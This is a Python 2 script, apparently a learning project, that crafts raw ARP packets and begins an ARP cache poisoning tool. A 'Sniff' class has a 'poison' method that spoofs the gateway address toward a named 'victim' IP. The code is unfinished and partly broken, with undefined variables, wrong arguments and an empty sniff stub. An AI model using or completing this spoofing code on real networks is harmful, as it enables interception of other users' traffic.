from struct import pack,unpack
from socket import *
from collections import OrderedDict
from subprocess import Popen, PIPE
from os import popen

import threading

### UTILS ###
ETHERTYPE_IP = 0x0800
ETHERTYPE_ARP = 0x0806 

p8 = lambda x : pack("!B", x) 
p16 = lambda x : pack("!H", x) 

u8 = lambda x : unpack("!B", x)[0]
u16 = lambda x : unpack("!H", x)[0]

def mac2str(mac):
    ''' mac address to byte code '''
    return b"".join(chr(int(x, 16)) for x in str(mac).split(':'))

def str2mac(s):
    ''' byte code to mac address '''
    if isinstance(s, str):
        return ("%02x:"*6)[:-1] % tuple(map(ord, s))
    return ("%02x:"*6)[:-1] % tuple(s)

def getMyMac(iface):
    ''' Get my Mac address using RAW socket '''
    s = socket( AF_PACKET, SOCK_RAW, htons( ETHERTYPE_IP ) )
    s.bind(( iface, ETHERTYPE_IP ))
    return str2mac( s.getsockname()[4] )

def getMyIP():
    ''' Get my ip using AF_INET socket '''
    s = socket( AF_INET, SOCK_DGRAM )
    s.connect(( "8.8.8.8", 1 ))
    return s.getsockname()[0]

def getMacByIP(iface, ip):
    ''' Get mac address by ip using arp broadcast '''
    response = ARP(iface).sendrecvarp( "REQUEST", target_mac="ff:ff:ff:ff:ff:ff", target_ip=ip)
    print response['arp']['psrc'], ip
    if response['arp']['psrc'] == ip:
        return response['arp']['hwsrc']


def getGWIP():
    ''' Get default gateway IP for a local interface '''
    return popen("route|grep default|awk '{print $2}'").read()


    
    # return system_call("route -n get default | grep 'gateway' | awk '{print $2}'")

print getGWIP()

class ARP:
    def __init__(self, iface):
        self.iface = iface

        self.sender_mac = getMyMac( self.iface )
        self.sender_ip = getMyIP()
        self.target_mac = "ff:ff:ff:ff:ff:ff"
        self.target_ip = "0.0.0.0"
        
        
    def sendarp(self, op, dst=None, src=None, sender_mac=None, sender_ip=None, target_mac=None, target_ip=None):
        ''' send raw arp packet '''
        packet_frame = OrderedDict()
        #### ETHERNET HEADER ###
        packet_frame['dst']    = mac2str( self.target_mac if dst is None else dst )
        packet_frame['src']    = mac2str( self.sender_mac if src is None else src )
        packet_frame['type']   = p16( ETHERTYPE_ARP )
        
        #### ARP HEADER ####
        packet_frame['hwtype'] = p16( 0x0001 )
        packet_frame['ptype']  = p16( ETHERTYPE_IP )
        packet_frame['hwlen']  = p8 ( 6 )
        packet_frame['plen']   = p8 ( 4 ) 
        packet_frame['op']     = p16( {'REQUEST':1, 'REPLY':2}[op] )
        packet_frame['hwsrc']  = mac2str(   self.sender_mac if sender_mac is None else sender_mac )
        packet_frame['psrc']   = inet_aton( self.sender_ip  if sender_ip  is None else sender_ip )
        packet_frame['hwdst']  = mac2str(   self.target_mac if target_mac is None else target_mac )
        packet_frame['pdst']   = inet_aton( self.target_ip  if target_ip  is None else target_ip )

        # print packet_frame
        packet = b"".join( packet_frame.values() )
        print `packet`
        s = socket( AF_PACKET, SOCK_RAW, htons( ETHERTYPE_IP ) )
        try:
            s.bind(( self.iface, ETHERTYPE_IP ))
            s.send( packet )
            s.close()

        except Exception, e:
            print e
            exit(0)


    def sendrecvarp(self, op, dst=None, src=None, sender_mac=None, sender_ip=None, target_mac=None, target_ip=None, retry=0):
        ''' send arp packet and recv arp packet '''
        s = socket( AF_PACKET, SOCK_RAW, htons( ETHERTYPE_ARP ) )
        s.bind(( self.iface, ETHERTYPE_ARP )) # FOR RECV ARP PACKET

        while retry >= 0:
            thread = threading.Thread(
                target = self.sendarp,
                args = ( op, dst, src, sender_mac, sender_ip, target_mac, target_ip )
            )
            thread.start()
            response = self.parseArpHeader( s.recvfrom(1024)[0] )
            thread.join()

            print response
            if response is not None:
                s.close()
                return response
            
            retry -= 1


    @staticmethod
    def parseArpHeader(packet):
        ''' parse packet and pick arp header '''
        ether = {
            'dst' : str2mac( packet[0:6]) ,
            'src' : str2mac( packet[6:12] ),
            'type': u16( packet[12:14] ),
        }
        if ( ether['type'] == ETHERTYPE_ARP ):
            arp = {
                'op'   : u16( packet[20:22] ),
                'hwsrc': str2mac( packet[22:28] ),
                'psrc' : inet_ntoa( packet[28:32] ),
                'hwdst': str2mac( packet[32:38] ),
                'pdst' : inet_ntoa( packet[38:42] )
            }
            return {'ether':ether, 'arp':arp}
        return None
    

class Sniff(ARP):
    '''
    sender_mac : my_mac
    sender_ip : gateway_ip
    target_mac : victim_mac
    target_ip : victim_ip
    '''
    def __init__(self, arp, ip):
        self.ip = ip

    def poison(self):
        arp.sendarp(
            sender_mac = getMyMac( arp.iface ),
            sender_ip  = getGWIP(),
            target_mac = getMacByIP( ip ),
            target_ip  = ip
            )
        pass
    
    def sniff(self):
        pass


a = ARP("ens33")
# a.sendarp("REQUEST")
# a.sendarp('REQUEST', "00:0c:29:19:fc:d7", '192.168.248.128', "00:00:00:00:00:00",'192.168.248.254')

print getMacByIP("ens33", '192.168.248.254')
